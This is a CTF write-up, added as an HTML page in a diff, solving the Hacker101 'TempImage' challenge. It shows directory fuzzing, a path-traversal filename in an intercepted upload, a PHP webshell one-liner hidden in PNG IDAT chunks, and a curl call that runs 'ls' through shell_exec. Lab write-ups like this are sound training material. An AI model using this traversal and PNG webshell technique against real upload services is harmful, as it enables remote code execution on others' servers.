@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+	<h1>ctf.hacker101.com - TempImage</h1>
+
+	<p>
+	On starting the challenge, we are given an index page with a link to "upload.php".  Before I start uploading files, I fuzz the site for files subdirectories and files with ffuf.
+	</p>
+
+	.htpasswd               [Status: 403, Size: 288, Words: 21, Lines: 11, Duration: 107ms]<br>
+	.htaccess               [Status: 403, Size: 288, Words: 21, Lines: 11, Duration: 108ms]<br>
+	.hta                    [Status: 403, Size: 283, Words: 21, Lines: 11, Duration: 110ms]<br>
+	files                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 97ms]<br>
+	index.php               [Status: 200, Size: 202, Words: 6, Lines: 11, Duration: 101ms]<br>
+	php.ini                 [Status: 200, Size: 69888, Words: 9026, Lines: 1931, Duration: 98ms]<br>
+	server-status           [Status: 403, Size: 292, Words: 21, Lines: 11, Duration: 101ms]<br>
+
+	<p>
+	files looks like a directory so I fuzz https://ctf/files/FUZZ but it's just forbidden .ht apache files.  I ran all these 403's through a script of mine that tries various 403 bypass techniques and checks for 200 (<a href="https://github.com/garlic0x1/find_and_bypass_403">find_and_bypass_403</a>) but nothing worked.
+	</p>
+
+	<h2>Flag 1</h2>
+
+	<p>
+	Now that I have done some initial recon I start uploading files.  I upload a png called image.png and I get redirected to https://ctf/files/d4713a69e268a9511038376564018882_image.png.  I know that the file name is reflected in the url now so I upload the file again and intercept it in burp:
+	</p>
+
+	POST /18e626dfa8/doUpload.php HTTP/1.1<br>
+	Host: 35.190.155.168<br>
+	Content-Length: 49561<br>
+	Cache-Control: max-age=0<br>
+	Upgrade-Insecure-Requests: 1<br>
+	Origin: http://35.190.155.168<br>
+	Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLi1NPOsLgXYu1l5X<br>
+	User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36<br>
+	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>
+	Referer: http://35.190.155.168/18e626dfa8/upload.php<br>
+	Accept-Encoding: gzip, deflate<br>
+	Accept-Language: en-US,en;q=0.9<br>
+	Connection: close<br>
+	<br>
+	------WebKitFormBoundaryLi1NPOsLgXYu1l5X<br>
+	Content-Disposition: form-data; name="file"; filename="image.png"<br>
+	Content-Type: image/png<br>
+	<br>
+	PNG<br>
+	<br>
+	...............<br>
+	D®B`<br>
+	------WebKitFormBoundaryLi1NPOsLgXYu1l5X<br>
+	Content-Disposition: form-data; name="filename"<br>
+	<br>
+	image.png<br>
+	------WebKitFormBoundaryLi1NPOsLgXYu1l5X--<br>
+	<br>
+
+
+	<p>
+	Now I try modifying the filename in the second part of the data to "../image.png" and get a very interesting response:
+	</p>
+
+	<img src="tempimage.png">
+
+	<br>
+	<p>
+	So we get an error and a flag, very exciting.  The error says "failed to open stream" so now I try using a filename that exists on the server.  So I try the filename "../../index.php" and upload a php webshell but the server returns "ERROR: Only PNG format supported in trial."
+	</p>
+
+	<h2>Flag 2</h2>
+
+	<p>
+	Okay so we are only supposed to upload .png files.  After researching how php can be encoded into a valid png file, I decided this was the route to take.  There was also a hint suggesting looking into png chunks.  So I used the tool xss2png by vavkamil (<a href="https://github.com/vavkamil/xss2png">xss2png Github</a>) to encode "<?=$_GET[0]($_POST[1]);?>" into a png. I suggest reading the article <a href="https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/">Encoding Web Shells in PNG IDAT Chunks</a> for detailed information about this.
+	</p>
+
+	<p>
+	Okay so we can upload the encoded webshell but we don't have permission to modify index.php.  Now I'll see if I can just upload it elsewhere and execute it. I upload the png with the name "../../shell.php" and see the image in my browser at files/shell.php. Now I test the webshell with curl.
+	</p>
+
+	<h2>Command:</h2>
+
+	curl http://35.190.155.168/18e626dfa8/files/shell.php?0=shell_exec -X POST -d "1=ls" --output -
+
+	<h2>Output:</h2>
+
+	�PNG
+�
+IHDR ���lIDATx�c�<?PHP ECHO $_GET[0]($_POST[1]);?> ���-3>�����[=�w{ٞ�2U���Կ�w?[��1��H�bdd�`��Q0
+F�(�`
+
+
+</body>
+</html>
+
